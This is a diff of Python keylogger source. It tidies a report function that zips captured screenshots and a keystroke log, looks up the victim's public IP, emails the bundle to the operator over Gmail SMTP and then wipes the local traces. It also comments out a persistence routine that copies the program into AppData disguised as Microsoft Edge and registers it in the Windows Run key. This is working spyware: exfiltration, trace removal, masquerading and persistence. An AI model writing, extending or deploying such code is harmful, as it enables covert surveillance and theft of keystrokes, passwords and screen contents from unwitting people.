@@ -78,33 +78,30 @@ def attach_file(msg, filepath):
 
 def send_report():
     print("Trying to send report")
-    try:
-        if os.listdir(screenshots_folder):
-            print("Sending report")
-            data = str(urlopen('http://checkip.dyndns.com/').read())
-            ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
-            msg = MIMEMultipart()
-            msg['Subject'] = f"Report From {ip}"
-            msg['From'] = EMAIL
-            msg['To'] = EMAIL
-            zip_path = shutil.make_archive("screenshots_zip", "zip", screenshots_folder)
-            attach_file(msg, zip_path)
-            attach_file(msg, log_file)
+    # try:
+    if os.listdir(screenshots_folder):
+        print("Sending report")
+        data = str(urlopen('http://checkip.dyndns.com/').read())
+        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
+        msg = MIMEMultipart()
+        msg['Subject'] = f"Report From {ip}"
+        msg['From'] = EMAIL
+        msg['To'] = EMAIL
+        zip_path = shutil.make_archive("screenshots_zip", "zip", screenshots_folder)
+        attach_file(msg, zip_path)
+        attach_file(msg, log_file)
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
+            smtp_server.login(EMAIL, EMAIL_PASSWORD)
+            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
+        # clear files
+        with open(log_file, "w", encoding="utf-8") as f:
+            pass
+        if os.path.exists(screenshots_folder):
+            shutil.rmtree(screenshots_folder)
+        os.makedirs(screenshots_folder)
 
-            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
-                smtp_server.login(EMAIL, EMAIL_PASSWORD)
-                smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
-
-            # clear files
-            with open(log_file, "w", encoding="utf-8") as f:
-                pass
-
-            if os.path.exists(screenshots_folder):
-                shutil.rmtree(screenshots_folder)
-            os.makedirs(screenshots_folder)
-
-    except Exception as e:
-        print("Failed to send report")
+    # except Exception as e:
+    #     print("Failed to send report")
 
     timer = threading.Timer(REPORT_INTERVAL, send_report)
     timer.daemon = True
@@ -138,12 +135,12 @@ def setup():
 
     # setup persistence 
 
-    os_type = platform.system()
-    if os_type == "Windows":
-        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-        if not os.path.exists(location):
-            shutil.copyfile(executable, location)
-            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    # os_type = platform.system()
+    # if os_type == "Windows":
+    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+    #     if not os.path.exists(location):
+    #         shutil.copyfile(executable, location)
+    #         subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
